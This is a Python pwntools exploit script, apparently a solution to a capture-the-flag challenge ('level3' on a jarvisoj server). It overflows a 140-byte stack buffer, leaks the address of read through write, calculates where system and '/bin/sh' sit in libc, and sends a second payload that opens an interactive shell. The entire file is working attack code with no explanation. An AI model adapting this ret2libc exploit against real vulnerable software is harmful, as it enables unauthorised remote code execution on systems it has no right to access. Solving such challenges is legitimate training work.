#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'

from pwn import *
#context.log_level = "debug"
DEBUG = 0
LOCAL = 0
if LOCAL == 1:
        p = process('./level3')
else:
        #p = remote('127.0.0.1',6666)
        p = remote('pwn2.jarvisoj.com',9879)

elf = ELF('level3')
libc = ELF('libc-2.19.so')
#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
## func addr
ret = 0xdededede
system_addr = libc.symbols['system']
binsh_addr = next(libc.search('/bin/sh'))
vlun_addr = 0x0804844B
main_addr = 0x08048484
print hex(system_addr)
print hex(binsh_addr)

# write
plt_write = elf.symbols['write']
got_write = elf.got['write']
print "plt_write is {}".format(hex(plt_write))
print "got_write is {}".format(hex(got_write))

# read
plt_read= elf.symbols['read']
got_read = elf.got['read']
print "plt_read is {}".format(hex(plt_read))
print "got_read is {}".format(hex(got_read))

# get read len
payload2 = 'A' * 140 + p32(plt_write) + p32(vlun_addr) + p32(1) + p32(got_read) + p32(4)
p.recvuntil('Input:\n')
p.sendline(payload2)
tmp_data = p.recv(4)
print tmp_data
read_addr = u32(tmp_data)
print "recving read addr is {}".format(hex(read_addr))
length_read = read_addr - plt_read

# system addr
plt_system = libc.symbols['system']
got_system = plt_system + (read_addr - libc.symbols['read'])
print "got_system is {}".format(hex(got_system))

# /bin/sh addr
plt_binsh = next(libc.search('/bin/sh'))
got_binsh = plt_binsh + (read_addr - libc.symbols['read'])
print "got_binsh is {}".format(hex(got_binsh))

# get shell
payload3 = 'A' * 140 + p32(got_system) + p32(vlun_addr) + p32(got_binsh)
p.sendline(payload3)
p.interactive()

p.interactive()

